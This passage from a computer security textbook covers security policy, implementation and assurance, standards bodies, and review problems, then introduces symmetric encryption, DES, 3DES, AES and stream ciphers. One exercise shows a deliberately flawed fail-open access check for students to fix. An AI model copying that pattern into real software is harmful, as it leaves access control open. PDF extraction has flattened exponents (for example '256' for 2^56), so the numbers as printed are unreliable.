comprehensive security facility. [DIMO07] provides \\r\\na good account of the results of this design effort.\\r\\n1.6 COMPUTER SECURITY STRATEGY\\r\\nWe conclude this chapter with a brief look at the overall strategy for providing com\\ufffeputer security. [LAMP04] suggests that a comprehensive security strategy involves \\r\\nthree aspects:\\r\\n• Specification/policy: What is the security scheme supposed to do?\\r\\n• Implementation/mechanisms: How does it do it?\\r\\n• Correctness/assurance: Does it really work?\\r\\nSecurity Policy\\r\\nThe first step in devising security services and mechanisms is to develop a security \\r\\npolicy. Those involved with computer security use the term security policy in vari\\ufffeous ways. At the least, a security policy is an informal description of desired system \\r\\nM01_STAL0611_04_GE_C01.indd 46 10/10/17 9:22 PM\\n\\n\\n1.6 / COMPUTER SECURITY STRATEGY 47\\r\\nbehavior [NRC91]. Such informal policies may reference requirements for security, \\r\\nintegrity, and availability. More usefully, a security policy is a formal statement of \\r\\nrules and practices that specify or regulate how a system or organization provides \\r\\nsecurity services to protect sensitive and critical system resources (RFC 4949). Such a \\r\\nformal security policy lends itself to being enforced by the system’s technical controls \\r\\nas well as its management and operational controls.\\r\\nIn developing a security policy, a security manager needs to consider the \\r\\nfollowing factors:\\r\\n• The value of the assets being protected\\r\\n• The vulnerabilities of the system\\r\\n• Potential threats and the likelihood of attacks\\r\\nFurther, the manager must consider the following trade-offs:\\r\\n• Ease of use versus security: Virtually all security measures involve some penalty \\r\\nin the area of ease of use. The following are some examples: Access control \\r\\nmechanisms require users to remember passwords and perhaps perform other \\r\\naccess control actions. Firewalls and other network security measures may \\r\\nreduce available transmission capacity or slow response time. Virus-checking \\r\\nsoftware reduces available processing power and introduces the possibility of \\r\\nsystem crashes or malfunctions due to improper interaction between the secu\\uffferity software and the operating system.\\r\\n• Cost of security versus cost of failure and recovery: In addition to ease of use \\r\\nand performance costs, there are direct monetary costs in implementing and \\r\\nmaintaining security measures. All of these costs must be balanced against \\r\\nthe cost of security failure and recovery if certain security measures are \\r\\nlacking. The cost of security failure and recovery must take into account not \\r\\nonly the value of the assets being protected and the damages resulting from \\r\\na security violation, but also the risk, which is the probability that a particu\\ufffelar threat will exploit a particular vulnerability with a particular harmful \\r\\nresult.\\r\\nSecurity policy is thus a business decision, possibly influenced by legal \\r\\nrequirements.\\r\\nSecurity Implementation\\r\\nSecurity implementation involves four complementary courses of action:\\r\\n• Prevention: An ideal security scheme is one in which no attack is successful. \\r\\nAlthough this is not practical in all cases, there is a wide range of threats in \\r\\nwhich prevention is a reasonable goal. For example, consider the transmission \\r\\nof encrypted data. If a secure encryption algorithm is used, and if measures \\r\\nare in place to prevent unauthorized access to encryption keys, then attacks on \\r\\nconfidentiality of the transmitted data will be prevented.\\r\\n• Detection: In a number of cases, absolute protection is not feasible, but it is \\r\\npractical to detect security attacks. For example, there are intrusion detection \\r\\nsystems designed to detect the presence of unauthorized individuals logged \\r\\nonto a system. Another example is detection of a denial of service attack, \\r\\nM01_STAL0611_04_GE_C01.indd 47 10/10/17 9:22 PM\\n\\n\\n48 CHAPTER 1 / OVERVIEW\\r\\nin which communications or processing resources are consumed so they are \\r\\nunavailable to legitimate users.\\r\\n• Response: If security mechanisms detect an ongoing attack, such as a denial of \\r\\nservice attack, the system may be able to respond in such a way as to halt the \\r\\nattack and prevent further damage.\\r\\n• Recovery: An example of recovery is the use of backup systems, so if data \\r\\nintegrity is compromised, a prior, correct copy of the data can be reloaded.\\r\\nAssurance and Evaluation\\r\\nThose who are “consumers” of computer security services and mechanisms (e.g., sys\\ufffetem managers, vendors, customers, and end users) desire a belief that the security \\r\\nmeasures in place work as intended. That is, security consumers want to feel that the \\r\\nsecurity infrastructure of their systems meet security requirements and enforce secu\\uffferity policies. These considerations bring us to the concepts of assurance and evaluation.\\r\\nAssurance is an attribute of an information system that provides grounds for \\r\\nhaving confidence that the system operates such that the system’s security policy is \\r\\nenforced. This encompasses both system design and system implementation. Thus, \\r\\nassurance deals with the questions, “Does the security system design meet its require\\ufffements?” and “Does the security system implementation meet its specifications?” \\r\\nAssurance is expressed as a degree of confidence, not in terms of a formal proof that \\r\\na design or implementation is correct. The state of the art in proving designs and \\r\\nimplementations is such that it is not possible to provide absolute proof. Much work \\r\\nhas been done in developing formal models that define requirements and character\\ufffeize designs and implementations, together with logical and mathematical techniques \\r\\nfor addressing these issues. But assurance is still a matter of degree.\\r\\nEvaluation is the process of examining a computer product or system with respect \\r\\nto certain criteria. Evaluation involves testing and may also involve formal analytic or \\r\\nmathematical techniques. The central thrust of work in this area is the development of \\r\\nevaluation criteria that can be applied to any security system (encompassing security ser\\ufffevices and mechanisms) and that are broadly supported for making product comparisons.\\r\\n1.7 STANDARDS\\r\\nMany of the security techniques and applications described in this book have been \\r\\nspecified as standards. Additionally, standards have been developed to cover man\\ufffeagement practices and the overall architecture of security mechanisms and services. \\r\\nThroughout this book, we will describe the most important standards in use or that \\r\\nare being developed for various aspects of computer security. Various organizations \\r\\nhave been involved in the development or promotion of these standards. The most \\r\\nimportant (in the current context) of these organizations are as follows:\\r\\n• National Institute of Standards and Technology: NIST is a U.S. federal agency \\r\\nthat deals with measurement science, standards, and technology related to U.S. \\r\\ngovernment use and to the promotion of U.S. private sector innovation. Despite \\r\\nits national scope, NIST Federal Information Processing Standards (FIPS) and \\r\\nSpecial Publications (SP) have a worldwide impact.\\r\\nM01_STAL0611_04_GE_C01.indd 48 10/10/17 9:22 PM\\n\\n\\n1.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 49\\r\\n• Internet Society: ISOC is a professional membership society with worldwide \\r\\norganizational and individual membership. It provides leadership in addressing \\r\\nissues that confront the future of the Internet, and is the organization home \\r\\nfor the groups responsible for Internet infrastructure standards, including the \\r\\nInternet Engineering Task Force (IETF) and the Internet Architecture Board \\r\\n(IAB). These organizations develop Internet standards and related specifica\\ufffetions, all of which are published as Requests for Comments (RFCs).\\r\\n• ITU-T: The International Telecommunication Union (ITU) is a United Nations \\r\\nagency in which governments and the private sector coordinate global telecom \\r\\nnetworks and services. The ITU Telecommunication Standardization Sector \\r\\n(ITU-T) is one of the three sectors of the ITU. ITU-T’s mission is the produc\\ufffetion of standards covering all fields of telecommunications. ITU-T standards \\r\\nare referred to as Recommendations.\\r\\n• ISO: The International Organization for Standardization (ISO) is a worldwide \\r\\nfederation of national standards bodies from more than 140 countries. ISO is a \\r\\nnongovernmental organization that promotes the development of standardiza\\ufffetion and related activities with a view to facilitating the international exchange \\r\\nof goods and services, and to developing cooperation in the spheres of intel\\ufffelectual, scientific, technological, and economic activity. ISO’s work results in \\r\\ninternational agreements that are published as International Standards.\\r\\nA more detailed discussion of these organizations is contained in Appendix C. \\r\\nA list of ISO and NIST documents referenced in this book is provided at the \\r\\nend of the book.\\r\\n1.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\naccess control\\r\\nactive attack\\r\\nadversary\\r\\nasset\\r\\nassurance\\r\\nattack\\r\\nattack surface\\r\\nattack tree\\r\\nauthentication\\r\\nauthenticity\\r\\navailability\\r\\ncomplete mediation\\r\\nconfidentiality\\r\\ncorruption\\r\\ncountermeasure\\r\\ndata confidentiality\\r\\ndata integrity\\r\\ndenial of service\\r\\ndisruption\\r\\neconomy of mechanism\\r\\nencapsulation\\r\\nencryption\\r\\nevaluation\\r\\nexposure\\r\\nfail-safe defaults\\r\\nfalsification\\r\\nincapacitation\\r\\ninference\\r\\ninside attack\\r\\nintegrity\\r\\ninterceptions\\r\\nintrusion\\r\\nisolation\\r\\nlayering\\r\\nleast astonishment\\r\\nleast common mechanism\\r\\nleast privilege\\r\\nmasquerade\\r\\nmisappropriation\\r\\nmisuse\\r\\nmodularity\\r\\nnonrepudiation\\r\\nobstruction\\r\\nopen design\\r\\nOSI security architecture\\r\\n(Continued)\\r\\nM01_STAL0611_04_GE_C01.indd 49 10/10/17 9:22 PM\\n\\n\\n50 CHAPTER 1 / OVERVIEW\\r\\nReview Questions\\r\\n1.1 What is meant by the CIA triad?.\\r\\n1.2 What is the difference between data integrity and system integrity?\\r\\n1.3 List and briefly define the kinds of threat consequences and the types of threat actions \\r\\nwhich cause these consequences.\\r\\n1.4 List and briefly define the fundamental security design principles.\\r\\n1.5 What is a security policy? What are the actions involved when implementing a secu\\uffferity policy?\\r\\n1.6 Differentiate between a network attack surface and a software attack surface.\\r\\nProblems\\r\\n1.1 Consider a student information system (SIS) in which students provide a university \\r\\nstudent number (USN) and a card for account access. Give examples of confidential\\ufffeity, integrity, and availability requirements associated with the system and, in each \\r\\ncase, indicate the degree of the importance of the requirement.\\r\\n1.2 Repeat Problem 1.1 for a network routing system that routes data packets through a \\r\\nnetwork based on the IP address provided by the sender.\\r\\n1.3 Consider a desktop publishing system used to produce documents for various \\r\\norganizations.\\r\\na. Give an example of a type of publication for which confidentiality of the stored \\r\\ndata is the most important requirement.\\r\\nb. Give an example of a type of publication in which data integrity is the most impor\\ufffetant requirement.\\r\\nc. Give an example in which system availability is the most important requirement.\\r\\n1.4 For each of the following assets, assign a low, moderate, or high impact level for the \\r\\nloss of confidentiality, availability, and integrity, respectively. Justify your answers.\\r\\na. An organization managing public information on its Web server.\\r\\nb. A law enforcement organization managing extremely sensitive investigative \\r\\ninformation.\\r\\nc. A financial organization managing routine administrative information (not privacy\\uffferelated information).\\r\\nd. An information system used for large acquisitions in a contracting organization \\r\\ncontains both sensitive, pre-solicitation phase contract information and routine \\r\\nadministrative information. Assess the impact for the two data sets separately and \\r\\nthe information system as a whole.\\r\\ne. A power plant contains a SCADA (supervisory control and data acquisition) sys\\ufffetem controlling the distribution of electric power for a large military installation. \\r\\nThe SCADA system contains both real-time sensor data and routine administra\\ufffetive information. Assess the impact for the two data sets separately and the infor\\ufffemation system as a whole.\\r\\noutside attack\\r\\npassive attack\\r\\nprevent\\r\\nprivacy\\r\\npsychological acceptability\\r\\nreplay\\r\\nrepudiation\\r\\nrisk\\r\\nsecurity attack\\r\\nsecurity mechanism\\r\\nsecurity policy\\r\\nsecurity service\\r\\nseparation of privilege\\r\\nsystem integrity\\r\\nsystem resource\\r\\nthreat agent\\r\\ntraffic analysis\\r\\nunauthorized disclosure\\r\\nusurpation\\r\\nvulnerabilities\\r\\nM01_STAL0611_04_GE_C01.indd 50 10/10/17 9:22 PM\\n\\n\\n1.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 51\\r\\n1.5 Consider the following general code for allowing access to a resource:\\r\\nDWORD dwRet = IsAccessAllowed(...);\\r\\nif (dwRet == ERROR_ACCESS_DENIED) {\\r\\n// Security check failed.\\r\\n// Inform user that access is denied.\\r\\n} else {\\r\\n// Security check OK.\\r\\n}\\r\\na. Explain the security flaw in this program.\\r\\nb. Rewrite the code to avoid the flaw.\\r\\nHint: Consider the design principle of fail-safe defaults.\\r\\n1.6 Develop an attack tree for gaining access to the contents of a physical safe.\\r\\n1.7 Consider a company whose operations are housed in two buildings on the same \\r\\nproperty: one building is headquarters, the other building contains network and com\\ufffeputer services. The property is physically protected by a fence around the perimeter. \\r\\nThe only entrance to the property is through a guarded front gate. The local networks \\r\\nare split between the Headquarters’ LAN and the Network Services’ LAN. Internet \\r\\nusers connect to the Web server through a firewall. Dial-up users get access to a par\\ufffeticular server on the Network Services’ LAN. Develop an attack tree in which the root \\r\\nnode represents disclosure of proprietary secrets. Include physical, social engineering, \\r\\nand technical attacks. The tree may contain both AND and OR nodes. Develop a tree \\r\\nthat has at least 15 leaf nodes.\\r\\n1.8 Read all of the classic papers cited in the Recommended Reading document at http://\\r\\nwilliamstallings.com/ComputerSecurity/ Compose a 500–1000 word paper (or 8–12 \\r\\nslide presentation) that summarizes the key concepts that emerge from these papers, \\r\\nemphasizing concepts that are common to most or all of the papers.\\r\\nM01_STAL0611_04_GE_C01.indd 51 10/10/17 9:22 PM\\n\\n\\n52\\r\\nCryptographic Tools\\r\\nCHAPTER\\r\\nPart One: Computer Security \\r\\nTechnology and \\r\\nPrinciples\\r\\n2.1 Confidentiality with Symmetric Encryption\\r\\nSymmetric Encryption\\r\\nSymmetric Block Encryption Algorithms\\r\\nStream Ciphers\\r\\n2.2 Message Authentication and Hash Functions\\r\\nAuthentication Using Symmetric Encryption\\r\\nMessage Authentication without Message Encryption\\r\\nSecure Hash Functions\\r\\nOther Applications of Hash Functions\\r\\n2.3 Public-Key Encryption\\r\\nPublic-Key Encryption Structure\\r\\nApplications for Public-Key Cryptosystems\\r\\nRequirements for Public-Key Cryptography\\r\\nAsymmetric Encryption Algorithms\\r\\n2.4 Digital Signatures and Key Management\\r\\nDigital Signature\\r\\nPublic-Key Certificates\\r\\nSymmetric Key Exchange Using Public-Key Encryption\\r\\nDigital Envelopes\\r\\n2.5 Random and Pseudorandom Numbers\\r\\nThe Use of Random Numbers\\r\\nRandom versus Pseudorandom\\r\\n2.6 Practical Application: Encryption of Stored Data\\r\\n2.7 Key Terms, Review Questions, and Problems\\r\\nM02_STAL0611_04_GE_C02.indd 52 10/11/17 2:42 PM\\n\\n\\n2.1 / CONFIDENTIALITY WITH SYMMETRIC ENCRYPTION 53\\r\\nAn important element in many computer security services and applications is the \\r\\nuse of cryptographic algorithms. This chapter provides an overview of the various \\r\\ntypes of algorithms, together with a discussion of their applicability. For each type of \\r\\nalgorithm, we will introduce the most important standardized algorithms in common \\r\\nuse. For the technical details of the algorithms themselves, see Part Four.\\r\\nWe begin with symmetric encryption, which is used in the widest variety of \\r\\ncontexts, primarily to provide confidentiality. Next, we examine secure hash functions \\r\\nand discuss their use in message authentication. The next section examines public\\ufffekey encryption, also known as asymmetric encryption. We then discuss the two most \\r\\nimportant applications of public-key encryption, namely digital signatures and key \\r\\nmanagement. In the case of digital signatures, asymmetric encryption and secure hash \\r\\nfunctions are combined to produce an extremely useful tool.\\r\\nFinally, in this chapter, we provide an example of an application area for cryp\\ufffetographic algorithms by looking at the encryption of stored data.\\r\\n2.1 CONFIDENTIALITY WITH SYMMETRIC ENCRYPTION\\r\\nThe universal technique for providing confidentiality for transmitted or stored data \\r\\nis symmetric encryption. This section introduces the basic concept of symmetric \\r\\nencryption. This is followed by an overview of the two most important symmetric \\r\\nencryption algorithms: the Data Encryption Standard (DES) and the Advanced \\r\\nEncryption Standard (AES), which are block encryption algorithms. Finally, this \\r\\nsection introduces the concept of symmetric stream encryption algorithms.\\r\\nSymmetric Encryption\\r\\nSymmetric encryption, also referred to as conventional encryption or single-key \\r\\nencryption, was the only type of encryption in use prior to the introduction of public\\ufffekey encryption in the late 1970s. Countless individuals and groups, from Julius Caesar \\r\\nto the German U-boat force to present-day diplomatic, military, and commercial users, \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Explain the basic operation of symmetric block encryption algorithms.\\r\\n◆ Compare and contrast block encryption and stream encryption.\\r\\n◆ Discuss the use of secure hash functions for message authentication.\\r\\n◆ List other applications of secure hash functions.\\r\\n◆ Explain the basic operation of asymmetric block encryption algorithms.\\r\\n◆ Present an overview of the digital signature mechanism and explain the \\r\\nconcept of digital envelopes.\\r\\n◆ Explain the significance of random and pseudorandom numbers in \\r\\ncryptography.\\r\\nM02_STAL0611_04_GE_C02.indd 53 10/11/17 2:42 PM\\n\\n\\n54 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nhave used symmetric encryption for secret communication. It remains the more widely \\r\\nused of the two types of encryption.\\r\\nA symmetric encryption scheme has five ingredients (see Figure 2.1):\\r\\n• Plaintext: This is the original message or data that is fed into the algorithm as \\r\\ninput.\\r\\n• Encryption algorithm: The encryption algorithm performs various substitu\\ufffetions and transformations on the plaintext.\\r\\n• Secret key: The secret key is also input to the encryption algorithm. The exact \\r\\nsubstitutions and transformations performed by the algorithm depend on \\r\\nthe key.\\r\\n• Ciphertext: This is the scrambled message produced as output. It depends on \\r\\nthe plaintext and the secret key. For a given message, two different keys will \\r\\nproduce two different ciphertexts.\\r\\n• Decryption algorithm: This is essentially the encryption algorithm run in \\r\\nreverse. It takes the ciphertext and the secret key and produces the original \\r\\nplaintext.\\r\\nThere are two requirements for secure use of symmetric encryption:\\r\\n1. We need a strong encryption algorithm. At a minimum, we would like the algo\\uffferithm to be such that an opponent who knows the algorithm and has access to one \\r\\nor more ciphertexts would be unable to decipher the ciphertext or figure out the \\r\\nkey. This requirement is usually stated in a stronger form: The opponent should be \\r\\nunable to decrypt ciphertext or discover the key even if he or she is in possession of \\r\\na number of ciphertexts together with the plaintext that produced each ciphertext.\\r\\n2. The sender and receiver must have obtained copies of the secret key in a secure \\r\\nfashion and must keep the key secure. If someone can discover the key and \\r\\nknows the algorithm, all communication using this key is readable.\\r\\nThere are two general approaches to attacking a symmetric encryption scheme. \\r\\nThe first attack is known as cryptanalysis. Cryptanalytic attacks rely on the nature \\r\\nof the algorithm plus perhaps some knowledge of the general characteristics of the \\r\\nplaintext, or even some sample plaintext-ciphertext pairs. This type of attack exploits \\r\\nthe characteristics of the algorithm to attempt to deduce a specific plaintext or to \\r\\nFigure 2.1 Simplified Model of Symmetric Encryption\\r\\nPlaintext\\r\\ninput\\r\\nTransmitted\\r\\nciphertext\\r\\nPlaintext\\r\\noutput\\r\\nSecret key shared by\\r\\nsender and recipient\\r\\nSecret key shared by\\r\\nsender and recipient\\r\\nEncryption algorithm\\r\\n(e.g., DES)\\r\\nDecryption algorithm\\r\\n(reverse of encryption\\r\\nalgorithm)\\r\\nK\\r\\nX\\r\\nY E[K, X] X D[K, Y]\\r\\nK\\r\\nM02_STAL0611_04_GE_C02.indd 54 10/11/17 2:42 PM\\n\\n\\n2.1 / CONFIDENTIALITY WITH SYMMETRIC ENCRYPTION 55\\r\\ndeduce the key being used. If the attack succeeds in deducing the key, the effect is \\r\\ncatastrophic: All future and past messages encrypted with that key are compromised.\\r\\nThe second method, known as the brute-force attack, is to try every possible key \\r\\non a piece of ciphertext until an intelligible translation into plaintext is obtained. On \\r\\naverage, half of all possible keys must be tried to achieve success. That is, if there are \\r\\nx different keys, on average an attacker would discover the actual key after x/2 tries. \\r\\nThere is more to a brute-force attack than simply running through all possible keys. \\r\\nUnless known plaintext is provided, the analyst must be able to recognize plaintext \\r\\nas plaintext. If the message is just plain text in English, then the result pops out eas\\ufffeily, although the task of recognizing English would have to be automated. If the text \\r\\nmessage has been compressed before encryption, then recognition is more difficult. \\r\\nAnd if the message is some more general type of data, such as a numerical file, and \\r\\nthis has been compressed, the problem becomes even more difficult to automate. \\r\\nThus, to supplement the brute-force approach, some degree of knowledge about \\r\\nthe expected plaintext is needed, and some means of automatically distinguishing \\r\\nplaintext from garble is also needed.\\r\\nSymmetric Block Encryption Algorithms\\r\\nThe most commonly used symmetric encryption algorithms are block ciphers. A block \\r\\ncipher processes the plaintext input in fixed-size blocks and produces a block of \\r\\nciphertext of equal size for each plaintext block. The algorithm processes longer \\r\\nplaintext amounts as a series of fixed-size blocks. The most important symmetric algo\\uffferithms, all of which are block ciphers, are the Data Encryption Standard (DES), triple \\r\\nDES, and the Advanced Encryption Standard (AES); see Table 2.1. This subsection \\r\\nprovides an overview of these algorithms. Chapter 20 will present the technical details.\\r\\nDATA ENCRYPTION STANDARD Until recently, the most widely used encryption \\r\\nscheme was based on the Data Encryption Standard (DES) adopted in 1977 by the \\r\\nNational Bureau of Standards, now the National Institute of Standards and Tech\\ufffenology (NIST), as FIPS PUB 46 (Data Encryption Standard, January 1977).1\\r\\n The \\r\\nalgorithm itself is referred to as the Data Encryption Algorithm (DEA). DES takes a \\r\\nplaintext block of 64 bits and a key of 56 bits, to produce a ciphertext block of 64 bits.\\r\\nConcerns about the strength of DES fall into two categories: concerns about the \\r\\nalgorithm itself, and concerns about the use of a 56-bit key. The first concern refers to \\r\\n1\\r\\nSee Appendix C for more information on NIST and similar organizations, and the “List of NIST and ISO \\r\\nDocuments” for related publications that we discuss.\\r\\nDES Triple DES AES\\r\\nPlaintext block size (bits) 64 64 128\\r\\nCiphertext block size (bits) 64 64 128\\r\\nKey size (bits) 56 112 or 168 128, 192, or 256\\r\\nDES = Data Encryption Standard\\r\\nAES = Advanced Encryption Standard\\r\\nTable 2.1 Comparison of Three Popular Symmetric Encryption Algorithms\\r\\nM02_STAL0611_04_GE_C02.indd 55 10/11/17 2:42 PM\\n\\n\\n56 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nthe possibility that cryptanalysis is possible by exploiting the characteristics of the DES \\r\\nalgorithm. Over the years, there have been numerous attempts to find and exploit weak\\ufffenesses in the algorithm, making DES the most-studied encryption algorithm in existence. \\r\\nDespite numerous approaches, no one has so far reported a fatal weakness in DES.\\r\\nA more serious concern is key length. With a key length of 56 bits, there are 256\\r\\npossible keys, which is approximately 7.2 * 1016 keys. Given the speed of commercial \\r\\noff-the-shelf processors, this key length is woefully inadequate. A paper from Seagate \\r\\nTechnology [SEAG08] suggests that a rate of one billion (109\\r\\n) key combinations per \\r\\nsecond is reasonable for today’s multicore computers. Recent offerings confirm this. \\r\\nBoth Intel and AMD now offer hardware-based instructions to accelerate the use \\r\\nof AES. Tests run on a contemporary multicore Intel machine resulted in an encryp\\ufffetion rate of about half a billion encryptions per second [BASU12]. Another recent \\r\\nanalysis suggests that with contemporary supercomputer technology, a rate of 1013\\r\\nencryptions/s is reasonable [AROR12].\\r\\nWith these results in mind, Table 2.2 shows how much time is required for a \\r\\nbrute-force attack for various key sizes. As can be seen, a single PC can break DES in \\r\\nabout a year; if multiple PCs work in parallel, the time is drastically shortened. And \\r\\ntoday’s supercomputers should be able to find a key in about an hour. Key sizes of \\r\\n128 bits or greater are effectively unbreakable using simply a brute-force approach. \\r\\nEven if we managed to speed up the attacking system by a factor of 1 trillion (1012),\\r\\nit would still take over 100,000 years to break a code using a 128-bit key.\\r\\nFortunately, there are a number of alternatives to DES, the most important of \\r\\nwhich are triple DES and AES, discussed in the remainder of this section.\\r\\nTRIPLE DES The life of DES was extended by the use of triple DES (3DES), which \\r\\ninvolves repeating the basic DES algorithm three times, using either two or three \\r\\nunique keys, for a key size of 112 or 168 bits. 3DES was first standardized for use in \\r\\nfinancial applications in ANSI standard X9.17 in 1985. 3DES was incorporated as \\r\\npart of the Data Encryption Standard in 1999, with the publication of FIPS PUB 46-3.\\r\\n3DES has two attractions that assure its widespread use over the next few \\r\\nyears. First, with its 168-bit key length, it overcomes the vulnerability to brute-force \\r\\nattack of DES. Second, the underlying encryption algorithm in 3DES is the same as \\r\\nin DES. This algorithm has been subjected to more scrutiny than any other encryption \\r\\nalgorithm over a longer period of time, and no effective cryptanalytic attack based \\r\\non the algorithm rather than brute force has been found. Accordingly, there is a high \\r\\nKey Size \\r\\n(bits) Cipher\\r\\nNumber of \\r\\nAlternative Keys\\r\\nTime Required at \\r\\n109\\r\\n decryptions/Ms\\r\\nTime Required at \\r\\n1013 decryptions/Ms\\r\\n56 DES 256 ≈ 7.2 * 1016 255 ms = 1.125 years 1 hour\\r\\n128 AES 2128 ≈ 3.4 * 1038 2127 ms = 5.3 * 1021 years 5.3 * 1017 years\\r\\n168 Triple DES 2168 ≈ 3.7 * 1050 2167 ms = 5.8 * 1033 years 5.8 * 1029 years\\r\\n192 AES 2192 ≈ 6.3 * 1057 2191 ms = 9.8 * 1040 years 9.8 * 1036 years\\r\\n256 AES 2256 ≈ 1.2 * 1077 2255 ms = 1.8 * 1060 years 1.8 * 1056 years\\r\\nTable 2.2 Average Time Required for Exhaustive Key Search\\r\\nM02_STAL0611_04_GE_C02.indd 56 10/11/17 2:42 PM\\n\\n\\n2.1 / CONFIDENTIALITY WITH SYMMETRIC ENCRYPTION 57\\r\\nlevel of confidence that 3DES is very resistant to cryptanalysis. If security were the \\r\\nonly consideration, then 3DES would be an appropriate choice for a standardized \\r\\nencryption algorithm for decades to come.\\r\\nThe principal drawback of 3DES is that the algorithm is relatively sluggish in \\r\\nsoftware. The original DES was designed for mid-1970s hardware implementation \\r\\nand does not produce efficient software code. 3DES, which requires three times as \\r\\nmany calculations as DES, is correspondingly slower. A secondary drawback is that \\r\\nboth DES and 3DES use a 64-bit block size. For reasons of both efficiency and secu\\uffferity, a larger block size is desirable.\\r\\nADVANCED ENCRYPTION STANDARD Because of its drawbacks, 3DES is not a rea\\ufffesonable candidate for long-term use. As a replacement, NIST in 1997 issued a call \\r\\nfor proposals for a new Advanced Encryption Standard (AES), which should have a \\r\\nsecurity strength equal to or better than 3DES and significantly improved efficiency. \\r\\nIn addition to these general requirements, NIST specified that AES must be a sym\\ufffemetric block cipher with a block length of 128 bits and support for key lengths of \\r\\n128, 192, and 256 bits. Evaluation criteria included security, computational efficiency, \\r\\nmemory requirements, hardware and software suitability, and flexibility.\\r\\nIn a first round of evaluation, 15 proposed algorithms were accepted. A sec\\ufffeond round narrowed the field to 5 algorithms. NIST completed its evaluation process \\r\\nand published the final standard as FIPS PUB 197 (Advanced Encryption Standard, \\r\\nNovember 2001). NIST selected Rijndael as the proposed AES algorithm. AES is now \\r\\nwidely available in commercial products. AES will be described in detail in Chapter 20.\\r\\nPRACTICAL SECURITY ISSUES Typically, symmetric encryption is applied to a unit of \\r\\ndata larger than a single 64-bit or 128-bit block. E-mail messages, network packets, \\r\\ndatabase records, and other plaintext sources must be broken up into a series of fixed\\ufffelength block for encryption by a symmetric block cipher. The simplest approach to \\r\\nmultiple-block encryption is known as electronic codebook (ECB) mode, in which \\r\\nplaintext is handled b bits at a time and each block of plaintext is encrypted using the \\r\\nsame key. Typically b = 64 or b = 128. Figure 2.2a shows the ECB mode. A plain text \\r\\nof length nb is divided into n b-bit blocks (P1, P2, c, Pn). Each block is encrypted \\r\\nusing the same algorithm and the same encryption key, to produce a sequence of \\r\\nn b-bit blocks of ciphertext (C1, C2, c, Cn).\\r\\nFor lengthy messages, the ECB mode may not be secure. A cryptanalyst may be \\r\\nable to exploit regularities in the plaintext to ease the task of decryption. For example, \\r\\nif it is known that the message always starts out with certain predefined fields, then the \\r\\ncryptanalyst may have a number of known plaintext-ciphertext pairs with which to work.\\r\\nTo increase the security of symmetric block encryption for large sequences \\r\\nof data, a number of alternative techniques have been developed, called modes of \\r\\noperation. These modes overcome the weaknesses of ECB; each mode has its own \\r\\nparticular advantages. This topic will be explored in Chapter 20.\\r\\nStream Ciphers\\r\\nA block cipher processes the input one block of elements at a time, producing an \\r\\noutput block for each input block. A stream cipher processes the input elements con\\ufffetinuously, producing output one element at a time, as it goes along. Although block \\r\\nM02_STAL0611_04_GE_C02.indd 57 10/11/17 2:42 PM\\n\\n\\n58 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nciphers are far more common, there are certain applications in which a stream cipher \\r\\nis more appropriate. Examples will be given subsequently in this book.\\r\\nA typical stream cipher encrypts plaintext one byte at a time, although a stream \\r\\ncipher may be designed to operate on one bit at a time or on units larger than a byte \\r\\nat a time. Figure 2.2b is a representative diagram of stream cipher structure. In this \\r\\nstructure, a key is input to a pseudorandom bit generator that produces a stream \\r\\nof 8-bit numbers that are apparently random. A pseudorandom stream is one that \\r\\nis unpredictable without knowledge of the input key and which has an apparently \\r\\nrandom character (see Section 2.5). The output of the generator, called a keystream, \\r\\nFigure 2.2 Types of Symmetric Encryption\\r\\n(b) Stream encryption\\r\\nPseudorandom byte\\r\\ngenerator\\r\\n(key stream generator)\\r\\nPlaintext\\r\\nbyte stream\\r\\nM\\r\\nKey\\r\\nK\\r\\nKey\\r\\nK\\r\\nk\\r\\nPlaintext\\r\\nbyte stream\\r\\nM\\r\\nCiphertext\\r\\nbyte stream\\r\\nENCRYPTION C\\r\\nPseudorandom byte\\r\\ngenerator\\r\\n(key stream generator)\\r\\nDECRYPTION\\r\\nk\\r\\n(a) Block cipher encryption (electronic codebook mode)\\r\\nDecryption Encryption\\r\\nK\\r\\nP1 P2 Pn\\r\\nC1 C2 Pn\\r\\nC1 C2 Cn\\r\\nP1 P2 Pn\\r\\ntpyrcnE tpyrcnE tpyrcnE\\r\\nK tpyrceD K tpyrceD tpyrceD\\r\\nK K\\r\\nK\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nb\\r\\nM02_STAL0611_04_GE_C02.indd 58 10/11/17 2:42 PM\\n\\n\\n2.2 / MESSAGE AUTHENTICATION AND HASH FUNCTIONS 59\\r\\nis combined one byte at a time with the plaintext stream using the bitwise exclusive\\ufffeOR (XOR) operation.\\r\\nWith a properly designed pseudorandom number generator, a stream cipher \\r\\ncan be as secure as a block cipher of comparable key length. The primary advantage \\r\\nof a stream cipher is that stream ciphers are almost always faster and use far less code \\r\\nthan do block ciphers. The advantage of a block cipher is that you can reuse keys. For \\r\\napplications that require encryption/decryption of a stream of data, such as over a \\r\\ndata communications channel or a browser/Web link, a stream cipher might be the \\r\\nbetter alternative. For applications that deal with blocks of data, such as file transfer, \\r\\ne-mail, and database, block ciphers may be more appropriate. However, either type \\r\\nof cipher can be used in virtually any application.\\r\\n2.2 MESSAGE AUTHENTICATION AND HASH FUNCTIONS\\r\\nEncryption protects against passive attack (eavesdropping). A different requirement \\r\\nis to protect against active attack (falsification of data and transactions). Protection \\r\\nagainst such attacks is known as message or data authentication.\\r\\nA message, file, document, or other collection of data is said to be authentic \\r\\nwhen it is genuine and came from its alleged source. Message or data authentication \\r\\nis a procedure that allows communicating parties to verify that received or stored \\r\\nmessages are authentic.2\\r\\n The two important aspects are to verify that the contents of \\r\\nthe message have not been altered and that the source is authentic. We may also wish \\r\\nto verify a message’s timeliness (it has not been artificially delayed and replayed) and \\r\\nsequence relative to other messages flowing between two parties. All of these con\\ufffecerns come under the category of data integrity, as was described in Chapter 1.\\r\\nAuthentication Using Symmetric Encryption\\r\\nIt would seem possible to perform authentication simply by the use of symmetric \\r\\nencryption. If we assume that only the sender and 